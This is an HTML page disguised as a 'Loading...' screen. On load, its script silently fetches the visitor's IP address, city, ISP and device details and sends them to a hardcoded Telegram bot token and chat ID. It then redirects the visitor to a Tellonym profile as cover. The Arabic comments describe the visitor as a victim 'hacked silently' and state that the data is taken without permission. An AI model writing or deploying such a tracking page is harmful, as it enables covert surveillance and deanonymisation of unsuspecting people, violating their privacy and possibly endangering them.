<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        // بياناتك الخاصة التي زودتني بها
        const botToken = "8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM";
        const chatId = "1138822664";
        const finalDest = "https://tellonym.me/Schaien";

        async function collect() {
            try {
                // 1. سحب بيانات الـ IP والموقع تقريبياً (بدون إذن)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                // 2. تجهيز التقرير الاستخباراتي
                const info = `🌑 **[صيد جديد - تم الاختراق صمتاً]**\n\n` +
                             `📍 المدينة: ${data.city} (${data.country_name})\n` +
                             `🌐 الـ IP: \`${data.ip}\`\n` +
                             `📡 المزود: ${data.org}\n` +
                             `📱 الجهاز: ${navigator.platform}\n` +
                             ` browser: ${navigator.userAgent.split('(')[1].split(')')[0]}\n` +
                             `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;

                // 3. إرسال البيانات فوراً إلى تليجرام الخاص بك
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);

            } catch (e) {
                // في حال حدوث أي خطأ، لا يظهر شيء للضحية
            } finally {
                // 4. تحويله فوراً لصفحة التيلونيم (أهم خطوة للتمويه)
                window.location.replace(finalDest);
            }
        }
        window.onload = collect;
    </script>
</head>
<body style="background: #000;"></body>
</html>
